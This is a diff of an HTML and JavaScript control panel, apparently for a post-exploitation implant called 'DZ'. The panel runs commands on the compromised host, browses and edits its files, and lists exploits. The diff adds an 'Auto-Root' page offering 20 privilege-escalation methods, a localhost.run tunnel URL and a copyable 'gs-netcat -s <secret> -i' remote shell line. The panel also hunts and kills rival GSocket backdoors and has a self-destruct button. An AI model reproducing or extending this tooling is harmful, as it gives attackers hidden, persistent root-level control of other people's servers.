@@ -3,7 +3,7 @@
 <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500&family=Inter:wght@400;500&display=swap" rel="stylesheet">
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
-:root{--bg:#030304;--panel:#0a0b0e;--card:#0d0e12;--glass:rgba(255,255,255,0.02);--border:rgba(255,255,255,0.06);--text:#9ca3af;--text2:#6b7280;--gold:#d4a012;--green:#10b981;--red:#ef4444;--blue:#3b82f6}
+:root{--bg:#030304;--panel:#0a0b0e;--card:#0d0e12;--glass:rgba(255,255,255,0.02);--border:rgba(255,255,255,0.06);--text:#9ca3af;--text2:#6b7280;--gold:#d4a012;--green:#10b981;--red:#ef4444;--blue:#3b82f6;--purple:#8b5cf6}
 html,body{height:100%%;overflow:hidden}
 body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);font-size:12px}
 .app{display:grid;grid-template-columns:52px 1fr;height:100vh}
@@ -29,15 +29,17 @@ main::-webkit-scrollbar{width:4px}main::-webkit-scrollbar-thumb{background:var(-
 .card{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:14px;position:relative}
 .card.full{grid-column:1/-1}
 .card-title{font-size:9px;color:var(--text2);text-transform:uppercase;letter-spacing:1px;margin-bottom:10px;display:flex;align-items:center;gap:6px}
-.card-value{font-family:'JetBrains Mono';font-size:18px;color:var(--text)}
+.card-value{font-family:'JetBrains Mono';font-size:16px;color:var(--text)}
 .card-sub{font-size:9px;color:var(--text2);margin-top:4px}
 .btn{background:linear-gradient(135deg,var(--gold),#b8860b);color:#000;border:none;padding:8px 16px;border-radius:6px;font-size:10px;font-weight:600;cursor:pointer;font-family:'Inter';transition:all .15s}
 .btn:hover{box-shadow:0 4px 12px rgba(212,160,18,0.3)}
+.btn:disabled{opacity:.5;cursor:not-allowed}
 .btn-sm{padding:5px 10px;font-size:9px}
 .btn-ghost{background:var(--glass);border:1px solid var(--border);color:var(--text)}
 .btn-ghost:hover{border-color:var(--gold);color:var(--gold)}
 .btn-red{background:var(--red);color:#fff}
-.btn-blue{background:var(--blue);color:#fff}
+.btn-green{background:var(--green);color:#fff}
+.btn-purple{background:var(--purple);color:#fff}
 .term{background:#000;border:1px solid var(--border);border-radius:8px;overflow:hidden}
 .term-header{background:linear-gradient(180deg,#151515,#0a0a0a);padding:8px 12px;display:flex;align-items:center;gap:6px;border-bottom:1px solid var(--border)}
 .term-dots{display:flex;gap:5px}
@@ -53,41 +55,42 @@ main::-webkit-scrollbar{width:4px}main::-webkit-scrollbar-thumb{background:var(-
 .ln.cmd{color:var(--gold)}.ln.cmd::before{content:'$';color:var(--gold)}
 .ln.ok{color:var(--green)}.ln.ok::before{content:'✓';color:var(--green)}
 .ln.err{color:var(--red)}.ln.err::before{content:'✗';color:var(--red)}
+.ln.warn{color:var(--gold)}.ln.warn::before{content:'!';color:var(--gold)}
 .term-input{display:flex;background:#0a0a0a;border-top:1px solid var(--border)}
 .term-input input{flex:1;background:transparent;border:none;padding:10px 12px;color:var(--text);font-family:'JetBrains Mono';font-size:11px;outline:none}
 .term-input button{background:var(--gold);color:#000;border:none;padding:0 16px;font-family:'JetBrains Mono';font-size:10px;font-weight:600;cursor:pointer}
-.exp-item{display:flex;align-items:center;padding:10px 12px;background:var(--glass);border:1px solid var(--border);border-radius:6px;margin-bottom:6px;cursor:pointer;transition:all .12s}
-.exp-item:hover{border-color:var(--gold);transform:translateX(3px)}
-.exp-cve{font-family:'JetBrains Mono';font-size:11px;font-weight:600;color:var(--gold);width:120px}
-.exp-name{flex:1;font-size:10px;color:var(--text2)}
-.exp-rate{font-family:'JetBrains Mono';font-size:11px;width:40px;text-align:right}
-.exp-bar{width:80px;height:4px;background:var(--glass);border-radius:2px;margin-left:10px;overflow:hidden}
-.exp-bar i{display:block;height:100%%;border-radius:2px}
-.gs-card{background:var(--glass);border:1px solid var(--border);border-radius:8px;margin-bottom:8px;overflow:hidden}
-.gs-card.hostile{border-color:rgba(239,68,68,0.3);background:rgba(239,68,68,0.03)}
-.gs-card.mine{border-color:rgba(16,185,129,0.3);background:rgba(16,185,129,0.03)}
-.gs-header{display:flex;align-items:center;padding:10px 12px;gap:8px}
-.gs-badge{font-size:8px;padding:3px 8px;border-radius:4px;text-transform:uppercase;font-weight:600}
-.gs-badge.listener{background:rgba(239,68,68,0.15);color:var(--red)}
-.gs-badge.exec{background:rgba(212,160,18,0.15);color:var(--gold)}
-.gs-badge.yours{background:rgba(16,185,129,0.15);color:var(--green)}
-.gs-secret{font-family:'JetBrains Mono';font-size:11px;color:var(--gold);flex:1}
-.gs-body{padding:10px 12px;border-top:1px solid var(--border);font-size:10px}
-.gs-body table{width:100%%}.gs-body td{padding:2px 0}.gs-body td:first-child{color:var(--text2);width:60px}
+.method-item{display:flex;align-items:center;padding:8px 12px;background:var(--glass);border:1px solid var(--border);border-radius:6px;margin-bottom:4px}
+.method-name{flex:1;font-size:10px}
+.method-status{font-family:'JetBrains Mono';font-size:9px;padding:3px 8px;border-radius:4px}
+.method-status.success{background:rgba(16,185,129,0.15);color:var(--green)}
+.method-status.failed{background:rgba(239,68,68,0.1);color:var(--red)}
+.method-status.checking{background:rgba(212,160,18,0.15);color:var(--gold)}
+.root-box{background:linear-gradient(135deg,rgba(16,185,129,0.1),rgba(16,185,129,0.02));border:2px solid rgba(16,185,129,0.3);border-radius:10px;padding:16px;margin-top:12px}
+.root-box h3{color:var(--green);font-size:12px;margin-bottom:8px}
+.root-box code{background:#000;padding:8px 12px;border-radius:4px;display:block;font-family:'JetBrains Mono';font-size:11px;color:var(--gold);margin-top:8px;cursor:pointer}
+.qs{display:flex;flex-wrap:wrap;gap:6px}
+.qs span{padding:8px 14px;background:var(--glass);border:1px solid var(--border);border-radius:6px;font-size:10px;color:var(--text2);cursor:pointer;transition:all .1s}
+.qs span:hover{border-color:var(--gold);color:var(--gold)}
+.page{display:none}.page.on{display:block}
+.stat-bar{height:4px;background:var(--glass);border-radius:2px;overflow:hidden;margin-top:8px}
+.stat-bar i{height:100%%;border-radius:2px;transition:width .3s}
+.alert{background:rgba(239,68,68,0.08);border:1px solid rgba(239,68,68,0.2);border-radius:8px;padding:12px;margin-bottom:16px;display:flex;align-items:center;gap:12px}
+.alert.success{background:rgba(16,185,129,0.08);border-color:rgba(16,185,129,0.2)}
+.alert-icon{font-size:20px}
+.alert-text{flex:1;font-size:11px}
+.alert-text strong{display:block;margin-bottom:2px}
 .fm-toolbar{display:flex;gap:6px;margin-bottom:12px;flex-wrap:wrap;align-items:center}
 .fm-path{font-family:'JetBrains Mono';font-size:10px;color:var(--text2);flex:1}
 .fm-path a{color:var(--gold);text-decoration:none}
-.fm-path a:hover{text-decoration:underline}
-.fm-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:8px}
+.fm-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:8px}
 .fm-item{display:flex;align-items:center;padding:10px;background:var(--glass);border:1px solid var(--border);border-radius:6px;cursor:pointer;transition:all .1s}
 .fm-item:hover{border-color:var(--gold);background:rgba(212,160,18,0.03)}
-.fm-item.selected{border-color:var(--gold);background:rgba(212,160,18,0.08)}
-.fm-icon{width:36px;height:36px;display:flex;align-items:center;justify-content:center;background:var(--card);border-radius:6px;margin-right:10px;font-size:16px}
+.fm-icon{width:32px;height:32px;display:flex;align-items:center;justify-content:center;background:var(--card);border-radius:6px;margin-right:10px;font-size:14px}
 .fm-icon.dir{background:rgba(212,160,18,0.1)}
 .fm-info{flex:1;min-width:0}
 .fm-name{font-size:11px;color:var(--text);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
-.fm-meta{font-family:'JetBrains Mono';font-size:9px;color:var(--text2);margin-top:2px}
-.modal{position:fixed;inset:0;background:rgba(0,0,0,0.8);display:flex;align-items:center;justify-content:center;z-index:1000;opacity:0;pointer-events:none;transition:opacity .2s}
+.fm-meta{font-family:'JetBrains Mono';font-size:8px;color:var(--text2);margin-top:2px}
+.modal{position:fixed;inset:0;background:rgba(0,0,0,0.85);display:flex;align-items:center;justify-content:center;z-index:1000;opacity:0;pointer-events:none;transition:opacity .2s}
 .modal.on{opacity:1;pointer-events:auto}
 .modal-box{background:var(--panel);border:1px solid var(--border);border-radius:12px;width:90%%;max-width:600px;max-height:80vh;overflow:hidden;display:flex;flex-direction:column}
 .modal-head{padding:16px;border-bottom:1px solid var(--border);display:flex;align-items:center}
@@ -98,30 +101,33 @@ main::-webkit-scrollbar{width:4px}main::-webkit-scrollbar-thumb{background:var(-
 .modal-body textarea{min-height:200px}
 .modal-foot{padding:16px;border-top:1px solid var(--border);display:flex;gap:8px;justify-content:flex-end}
 .preview-box{background:#000;border:1px solid var(--border);border-radius:6px;padding:12px;font-family:'JetBrains Mono';font-size:10px;white-space:pre-wrap;word-break:break-all;max-height:300px;overflow:auto;color:var(--text)}
-.qs{display:flex;flex-wrap:wrap;gap:6px}
-.qs span{padding:8px 14px;background:var(--glass);border:1px solid var(--border);border-radius:6px;font-size:10px;color:var(--text2);cursor:pointer;transition:all .1s}
-.qs span:hover{border-color:var(--gold);color:var(--gold)}
-.page{display:none}.page.on{display:block}
-.stat-bar{height:4px;background:var(--glass);border-radius:2px;overflow:hidden;margin-top:8px}
-.stat-bar i{height:100%%;border-radius:2px;transition:width .3s}
-.alert{background:rgba(239,68,68,0.08);border:1px solid rgba(239,68,68,0.2);border-radius:8px;padding:12px;margin-bottom:16px;display:flex;align-items:center;gap:12px}
-.alert-icon{font-size:20px}
-.alert-text{flex:1;font-size:11px;color:var(--red)}
-.alert-text strong{display:block;margin-bottom:2px}
+.gs-card{background:var(--glass);border:1px solid var(--border);border-radius:8px;margin-bottom:8px;overflow:hidden}
+.gs-card.hostile{border-color:rgba(239,68,68,0.3);background:rgba(239,68,68,0.03)}
+.gs-card.mine{border-color:rgba(16,185,129,0.3);background:rgba(16,185,129,0.03)}
+.gs-header{display:flex;align-items:center;padding:10px 12px;gap:8px}
+.gs-badge{font-size:8px;padding:3px 8px;border-radius:4px;text-transform:uppercase;font-weight:600}
+.gs-badge.yours{background:rgba(16,185,129,0.15);color:var(--green)}
+.gs-badge.hostile{background:rgba(239,68,68,0.15);color:var(--red)}
+.gs-secret{font-family:'JetBrains Mono';font-size:11px;color:var(--gold);flex:1}
+.gs-body{padding:10px 12px;border-top:1px solid var(--border);font-size:10px}
+.gs-body table{width:100%%}.gs-body td{padding:2px 0}.gs-body td:first-child{color:var(--text2);width:60px}
 input[type=file]{display:none}
+.url-box{background:var(--glass);border:1px solid var(--border);border-radius:6px;padding:10px;font-family:'JetBrains Mono';font-size:10px;display:flex;align-items:center;gap:8px;margin-top:8px}
+.url-box a{color:var(--gold);flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.url-box button{flex-shrink:0}
 </style></head>
 <body>
 <div class="app">
 <nav class="sidebar">
 <div class="logo">DZ</div>
 <div class="nav-item on" data-p="dash" title="Dashboard"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="7" height="9"/><rect x="14" y="3" width="7" height="5"/><rect x="14" y="12" width="7" height="9"/><rect x="3" y="16" width="7" height="5"/></svg></div>
+<div class="nav-item" data-p="root" title="Auto-Root"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M12 8v4m0 4h.01"/></svg></div>
 <div class="nav-item" data-p="exp" title="Exploits"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"/></svg></div>
 <div class="nav-item" data-p="term" title="Terminal"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg></div>
 <div class="nav-item" data-p="files" title="Files"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 19a2 2 0 01-2 2H4a2 2 0 01-2-2V5a2 2 0 012-2h5l2 3h9a2 2 0 012 2z"/></svg></div>
 <div class="nav-sep"></div>
-<div class="nav-item" data-p="gs" title="GSocket Scanner"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg></div>
-<div class="nav-item" data-p="proc" title="Processes"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg></div>
-<div class="nav-item" data-p="net" title="Network"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 014 10 15.3 15.3 0 01-4 10 15.3 15.3 0 01-4-10 15.3 15.3 0 014-10z"/></svg></div>
+<div class="nav-item" data-p="gs" title="GSocket Scanner"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><path d="M21 21l-4.35-4.35"/></svg></div>
+<div class="nav-item" data-p="proc" title="Processes"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/></svg></div>
 <div style="margin-top:auto">
 <div class="nav-sep"></div>
 <div class="nav-item" data-p="cfg" title="Config"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 00.33 1.82l.06.06a2 2 0 010 2.83 2 2 0 01-2.83 0l-.06-.06a1.65 1.65 0 00-1.82-.33 1.65 1.65 0 00-1 1.51V21a2 2 0 01-4 0v-.09A1.65 1.65 0 009 19.4a1.65 1.65 0 00-1.82.33l-.06.06a2 2 0 01-2.83-2.83l.06-.06a1.65 1.65 0 00.33-1.82 1.65 1.65 0 00-1.51-1H3a2 2 0 010-4h.09A1.65 1.65 0 004.6 9a1.65 1.65 0 00-.33-1.82l-.06-.06a2 2 0 012.83-2.83l.06.06a1.65 1.65 0 001.82.33H9a1.65 1.65 0 001-1.51V3a2 2 0 114 0v.09a1.65 1.65 0 001 1.51 1.65 1.65 0 001.82-.33l.06-.06a2 2 0 012.83 2.83l-.06.06a1.65 1.65 0 00-.33 1.82V9a1.65 1.65 0 001.51 1H21a2 2 0 010 4h-.09a1.65 1.65 0 00-1.51 1z"/></svg></div>
@@ -131,10 +137,7 @@ input[type=file]{display:none}
 <main>
 <!-- DASHBOARD -->
 <div id="p-dash" class="page on">
-<div class="topbar">
-<div class="topbar-title">System <span>Overview</span></div>
-<div class="topbar-host"><span class="dot"></span><span id="th">-</span></div>
-</div>
+<div class="topbar"><div class="topbar-title">System <span>Overview</span></div><div class="topbar-host"><span class="dot"></span><span id="th">%s</span></div></div>
 <div id="dash-alert"></div>
 <div class="grid grid-4">
 <div class="card"><div class="card-title">👤 User</div><div class="card-value" id="s_user">-</div><div class="card-sub" id="s_uid"></div></div>
@@ -144,9 +147,20 @@ input[type=file]{display:none}
 </div>
 <div class="grid grid-2">
 <div class="card"><div class="card-title">📊 Resources</div><div id="live-stats"></div></div>
-<div class="card"><div class="card-title">⚡ Quick Actions</div><div class="qs"><span onclick="nav('exp')">🔥 Exploits</span><span onclick="nav('gs')">🛡 GSockets</span><span onclick="nav('term')">💻 Shell</span><span onclick="nav('files')">📁 Files</span><span onclick="pull()">🔄 Update</span></div></div>
+<div class="card"><div class="card-title">⚡ Quick Actions</div><div class="qs"><span onclick="nav('root')">🔓 Auto-Root</span><span onclick="nav('exp')">🔥 Exploits</span><span onclick="nav('gs')">🛡 GSockets</span><span onclick="nav('term')">💻 Shell</span><span onclick="pull()">🔄 Update</span></div></div>
 </div>
-<div class="card full"><div class="card-title">🔍 Vulnerability Scanner</div><div id="scan-result"></div></div>
+<div class="card full"><div class="card-title">🌐 Access URLs</div><div id="access-urls"></div></div>
+</div>
+
+<!-- AUTO-ROOT -->
+<div id="p-root" class="page">
+<div class="topbar"><div class="topbar-title">Auto <span>Root</span> - 20 LPE Methods</div><button class="btn btn-purple" onclick="runAutoRoot()" id="btn-autoroot">🚀 Start Auto-Root</button></div>
+<div class="alert success" style="display:none" id="root-success"><span class="alert-icon">🎉</span><div class="alert-text"><strong>ROOT ACCESS ACHIEVED!</strong><span id="root-success-msg"></span></div></div>
+<div class="grid grid-2">
+<div class="card"><div class="card-title">🔍 LPE Methods</div><div id="method-list"></div></div>
+<div class="card"><div class="card-title">📋 Output</div><div class="term"><div class="term-header"><div class="term-dots"><span></span><span></span><span></span></div><div class="term-title">autoroot.sh</div></div><div class="term-body" id="root-out" style="max-height:400px"></div></div></div>
+</div>
+<div id="root-result" style="margin-top:12px"></div>
 </div>
 
 <!-- EXPLOITS -->
@@ -158,7 +172,7 @@ input[type=file]{display:none}
 <!-- TERMINAL -->
 <div id="p-term" class="page">
 <div class="topbar"><div class="topbar-title">Shell <span>Terminal</span></div></div>
-<div class="card"><div class="qs" style="margin-bottom:12px"><span onclick="rs('scripts/sysinfo.sh')">sysinfo</span><span onclick="rs('scripts/recon.sh')">recon</span><span onclick="rs('scripts/privesc.sh')">privesc</span><span onclick="rs('scripts/gscan.sh')">gscan</span></div></div>
+<div class="card"><div class="qs" style="margin-bottom:12px"><span onclick="rs('scripts/sysinfo.sh')">sysinfo</span><span onclick="rs('scripts/recon.sh')">recon</span><span onclick="rs('scripts/privesc.sh')">privesc</span><span onclick="rs('scripts/gscan.sh')">gscan</span><span onclick="rs('scripts/autoroot.sh')">autoroot</span></div></div>
 <div class="term" style="height:calc(100vh - 220px)"><div class="term-header"><div class="term-dots"><span></span><span></span><span></span></div><div class="term-title">bash</div></div><div class="term-body" id="term-out" style="max-height:calc(100vh - 320px)"></div><div class="term-input"><input id="term-cmd" placeholder="$ enter command" onkeydown="event.key==='Enter'&&termExec()"><button onclick="termExec()">RUN</button></div></div>
 </div>
 
@@ -168,35 +182,29 @@ input[type=file]{display:none}
 <div class="fm-toolbar">
 <div class="fm-path" id="fm-path">~</div>
 <button class="btn btn-sm btn-ghost" onclick="fmUp()">⬆ Up</button>
-<button class="btn btn-sm btn-ghost" onclick="fmRefresh()">🔄 Refresh</button>
-<button class="btn btn-sm btn-ghost" onclick="fmNewFile()">📄 New File</button>
-<button class="btn btn-sm btn-ghost" onclick="fmNewDir()">📁 New Folder</button>
-<label class="btn btn-sm btn-ghost">📤 Upload<input type="file" id="fm-upload" onchange="fmUpload(this.files)"></label>
+<button class="btn btn-sm btn-ghost" onclick="fmRefresh()">🔄</button>
+<button class="btn btn-sm btn-ghost" onclick="fmNewFile()">📄 New</button>
+<button class="btn btn-sm btn-ghost" onclick="fmNewDir()">📁 Folder</button>
+<label class="btn btn-sm btn-ghost">📤 Upload<input type="file" onchange="fmUpload(this.files)" multiple></label>
 </div>
 <div class="fm-grid" id="fm-list"></div>
 </div>
 
-<!-- GSOCKET SCANNER -->
+<!-- GSOCKET -->
 <div id="p-gs" class="page">
-<div class="topbar"><div class="topbar-title">GSocket <span>Scanner</span></div><div style="display:flex;gap:8px"><button class="btn btn-sm" onclick="gsScan()">🔍 Deep Scan</button><button class="btn btn-sm btn-red" onclick="gsKillAll()">☠ Kill All Hostile</button></div></div>
+<div class="topbar"><div class="topbar-title">GSocket <span>Scanner</span></div><div style="display:flex;gap:8px"><button class="btn btn-sm" onclick="gsScan()">🔍 Scan</button><button class="btn btn-sm btn-red" onclick="gsKillAll()">☠ Kill All</button></div></div>
 <div id="gs-alert"></div>
-<div class="card"><div class="card-title">🚨 Detected GSocket Backdoors</div><div id="gs-list"></div></div>
+<div class="card"><div class="card-title">🔍 Detected GSockets</div><div id="gs-list"></div></div>
 <div class="card" style="margin-top:12px"><div class="card-title">🔐 Your Access</div>
 <div class="gs-card mine"><div class="gs-header"><span class="gs-badge yours">YOURS</span><span class="gs-secret" id="my-gs">%s</span></div>
-<div class="gs-body"><table><tr><td>Connect:</td><td>gs-netcat -s %s -p 8888</td></tr><tr><td>Browser:</td><td>http://127.0.0.1:8888</td></tr></table></div></div>
+<div class="gs-body"><table><tr><td>Shell:</td><td>gs-netcat -s %s -i</td></tr></table></div></div>
 </div>
 </div>
 
 <!-- PROCESSES -->
 <div id="p-proc" class="page">
-<div class="topbar"><div class="topbar-title">Process <span>Monitor</span></div><button class="btn btn-sm" onclick="loadProc()">🔄 Refresh</button></div>
-<div class="term"><div class="term-header"><div class="term-dots"><span></span><span></span><span></span></div><div class="term-title">ps aux --sort=-%%mem</div></div><div class="term-body" id="proc-out" style="max-height:calc(100vh - 200px)"></div></div>
-</div>
-
-<!-- NETWORK -->
-<div id="p-net" class="page">
-<div class="topbar"><div class="topbar-title">Network <span>Info</span></div><button class="btn btn-sm" onclick="loadNet()">🔄 Refresh</button></div>
-<div class="term"><div class="term-header"><div class="term-dots"><span></span><span></span><span></span></div><div class="term-title">connections</div></div><div class="term-body" id="net-out" style="max-height:calc(100vh - 200px)"></div></div>
+<div class="topbar"><div class="topbar-title">Process <span>Monitor</span></div><button class="btn btn-sm" onclick="loadProc()">🔄</button></div>
+<div class="term"><div class="term-header"><div class="term-dots"><span></span><span></span><span></span></div><div class="term-title">ps aux</div></div><div class="term-body" id="proc-out" style="max-height:calc(100vh - 200px)"></div></div>
 </div>
 
 <!-- CONFIG -->
@@ -204,19 +212,18 @@ input[type=file]{display:none}
 <div class="topbar"><div class="topbar-title">Configuration</div></div>
 <div class="grid grid-2">
 <div class="card"><div class="card-title">🔑 Deploy Key</div><div class="preview-box" style="font-size:9px;cursor:pointer" onclick="copyThis(this)">%s</div></div>
-<div class="card"><div class="card-title">🖥 Target Info</div><div class="preview-box" id="cfg-info">%s</div></div>
+<div class="card"><div class="card-title">🖥 System Info</div><div class="preview-box" id="cfg-info">%s</div></div>
 </div>
-<div class="card" style="margin-top:12px"><div class="card-title">⚙ Actions</div><div style="display:flex;gap:8px;flex-wrap:wrap"><button class="btn" onclick="pull()">🔄 Update Repo</button><button class="btn btn-ghost" onclick="termExec2('id;whoami;pwd')">🔍 Check ID</button><button class="btn btn-red" onclick="nuke()">☠ Self-Destruct</button></div></div>
+<div class="card" style="margin-top:12px"><div class="card-title">🌐 Current URL</div><div class="url-box"><a href="%s" target="_blank" id="current-url">%s</a><button class="btn btn-sm" onclick="copyUrl()">Copy</button><button class="btn btn-sm btn-ghost" onclick="refreshUrl()">Refresh</button></div></div>
+<div class="card" style="margin-top:12px"><div class="card-title">⚙ Actions</div><div style="display:flex;gap:8px;flex-wrap:wrap"><button class="btn" onclick="pull()">🔄 Update</button><button class="btn btn-ghost" onclick="termExec2('id;whoami;pwd')">🔍 ID</button><button class="btn btn-red" onclick="nuke()">☠ Destruct</button></div></div>
 </div>
 </main>
 </div>
 
 <!-- MODALS -->
-<div class="modal" id="modal-view"><div class="modal-box"><div class="modal-head"><h3 id="modal-view-title">View File</h3><button onclick="closeModal('modal-view')">×</button></div><div class="modal-body"><div class="preview-box" id="modal-view-content"></div></div><div class="modal-foot"><button class="btn btn-ghost" onclick="closeModal('modal-view')">Close</button><button class="btn" onclick="fmDownloadCurrent()">Download</button></div></div></div>
-
-<div class="modal" id="modal-edit"><div class="modal-box"><div class="modal-head"><h3 id="modal-edit-title">Edit File</h3><button onclick="closeModal('modal-edit')">×</button></div><div class="modal-body"><textarea id="modal-edit-content"></textarea></div><div class="modal-foot"><button class="btn btn-ghost" onclick="closeModal('modal-edit')">Cancel</button><button class="btn" onclick="fmSaveEdit()">Save</button></div></div></div>
-
-<div class="modal" id="modal-new"><div class="modal-box"><div class="modal-head"><h3 id="modal-new-title">New File</h3><button onclick="closeModal('modal-new')">×</button></div><div class="modal-body"><input type="text" id="modal-new-name" placeholder="filename.txt" style="margin-bottom:12px"><textarea id="modal-new-content" placeholder="File content..."></textarea></div><div class="modal-foot"><button class="btn btn-ghost" onclick="closeModal('modal-new')">Cancel</button><button class="btn" onclick="fmSaveNew()">Create</button></div></div></div>
+<div class="modal" id="modal-view"><div class="modal-box"><div class="modal-head"><h3 id="modal-view-title">View</h3><button onclick="closeModal('modal-view')">×</button></div><div class="modal-body"><div class="preview-box" id="modal-view-content"></div></div><div class="modal-foot"><button class="btn btn-ghost" onclick="closeModal('modal-view')">Close</button><button class="btn" onclick="fmEdit(currentFile)">Edit</button><button class="btn" onclick="fmDownload(currentFile)">Download</button></div></div></div>
+<div class="modal" id="modal-edit"><div class="modal-box"><div class="modal-head"><h3 id="modal-edit-title">Edit</h3><button onclick="closeModal('modal-edit')">×</button></div><div class="modal-body"><textarea id="modal-edit-content"></textarea></div><div class="modal-foot"><button class="btn btn-ghost" onclick="closeModal('modal-edit')">Cancel</button><button class="btn" onclick="fmSaveEdit()">Save</button></div></div></div>
+<div class="modal" id="modal-new"><div class="modal-box"><div class="modal-head"><h3>New File</h3><button onclick="closeModal('modal-new')">×</button></div><div class="modal-body"><input type="text" id="modal-new-name" placeholder="filename.txt" style="margin-bottom:12px"><textarea id="modal-new-content" placeholder="Content..."></textarea></div><div class="modal-foot"><button class="btn btn-ghost" onclick="closeModal('modal-new')">Cancel</button><button class="btn" onclick="fmSaveNew()">Create</button></div></div></div>
 
 <script>
 const $=id=>document.getElementById(id);
@@ -229,300 +236,116 @@ document.querySelectorAll('.nav-item[data-p]').forEach(n=>n.onclick=()=>nav(n.da
 
 let cwd='/',myGs='',currentFile='',sysData={};
 
-function nav(p){
-document.querySelectorAll('.page').forEach(x=>x.classList.remove('on'));
-document.querySelectorAll('.nav-item').forEach(x=>x.classList.remove('on'));
-$('p-'+p)?.classList.add('on');
-document.querySelector('.nav-item[data-p="'+p+'"]')?.classList.add('on');
-if(p==='exp')loadExp();
-if(p==='proc')loadProc();
-if(p==='net')loadNet();
-if(p==='gs')gsScan();
-if(p==='files')fmLoad(cwd);
-}
-
+function nav(p){document.querySelectorAll('.page').forEach(x=>x.classList.remove('on'));document.querySelectorAll('.nav-item').forEach(x=>x.classList.remove('on'));$('p-'+p)?.classList.add('on');document.querySelector('.nav-item[data-p="'+p+'"]')?.classList.add('on');if(p==='exp')loadExp();if(p==='proc')loadProc();if(p==='gs')gsScan();if(p==='files')fmLoad(cwd);}
 function openModal(id){$(id).classList.add('on');}
 function closeModal(id){$(id).classList.remove('on');}
 
 async function init(){
 myGs=$('my-gs')?.innerText||'';
 const r=await api('run',{path:'scripts/sysinfo.sh'});
-try{
-const d=JSON.parse(r.output||'{}');
-sysData=d;
-$('s_user').textContent=d.user||'-';
-$('s_uid').textContent='uid:'+(d.uid||'?');
-$('s_kernel').textContent=(d.kernel||'-').split('-')[0];
-$('s_up').textContent=d.uptime||'-';
-$('s_mem').textContent=d.mem||'-';
-$('th').textContent=d.hostname||'target';
-document.title='DZ • '+(d.hostname||'target');
-$('cfg-info').textContent=JSON.stringify(d,null,2);
-}catch(e){console.error(e);}
-scanInit();
-fmLoad('/');
-startLive();
-checkGsAlert();
+try{const d=JSON.parse(r.output||'{}');sysData=d;$('s_user').textContent=d.user||'-';$('s_uid').textContent='uid:'+(d.uid||'?');$('s_kernel').textContent=(d.kernel||'-').split('-')[0];$('s_up').textContent=d.uptime||'-';$('s_mem').textContent=d.mem||'-';$('th').textContent=d.hostname||'target';document.title='DZ • '+(d.hostname||'target');$('cfg-info').textContent=JSON.stringify(d,null,2);}catch(e){}
+updateAccessUrls();fmLoad('/');startLive();checkGsAlert();initMethodList();
 }
 
-function startLive(){
-async function upd(){
-const r=await api('exec',{cmd:"cat /proc/loadavg 2>/dev/null|awk '{print $1}';free 2>/dev/null|awk '/Mem:/{if($2>0)print int($3*100/$2);else print 0}';df / 2>/dev/null|tail -1|awk '{gsub(/%%/,\"\");print $5}'"});
-const[load,mem,disk]=(r.output||'0\n0\n0').trim().split('\n');
-$('live-stats').innerHTML=`
-<div style="margin-bottom:10px"><div style="display:flex;justify-content:space-between;font-size:10px"><span>CPU Load</span><span>${load}</span></div></div>
-<div style="margin-bottom:10px"><div style="display:flex;justify-content:space-between;font-size:10px"><span>Memory</span><span>${mem}%%</span></div><div class="stat-bar"><i style="width:${mem}%%;background:${mem>80?'var(--red)':'var(--green)'}"></i></div></div>
-<div><div style="display:flex;justify-content:space-between;font-size:10px"><span>Disk</span><span>${disk}%%</span></div><div class="stat-bar"><i style="width:${disk}%%;background:${disk>80?'var(--red)':'var(--green)'}"></i></div></div>`;
-}
-upd();setInterval(upd,5000);
+async function updateAccessUrls(){
+const info=await api('info',{});
+let h='<div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">';
+h+=`<div><div style="font-size:9px;color:var(--text2);margin-bottom:4px">WEB URL (localhost.run)</div><div class="url-box"><a href="${info.url||'#'}" target="_blank">${info.url||'Connecting...'}</a><button class="btn btn-sm" onclick="navigator.clipboard.writeText('${info.url||''}')">Copy</button></div></div>`;
+h+=`<div><div style="font-size:9px;color:var(--text2);margin-bottom:4px">SHELL (GSSocket)</div><div class="url-box"><code style="color:var(--gold);flex:1">gs-netcat -s ${info.gs} -i</code><button class="btn btn-sm" onclick="navigator.clipboard.writeText('gs-netcat -s ${info.gs} -i')">Copy</button></div></div>`;
+h+='</div>';
+$('access-urls').innerHTML=h;
+if(info.url)$('current-url').href=info.url,$('current-url').textContent=info.url;
 }
 
-async function checkGsAlert(){
-const r=await api('run',{path:'scripts/gscan.sh'});
-try{
-const d=JSON.parse(r.output||'{}');
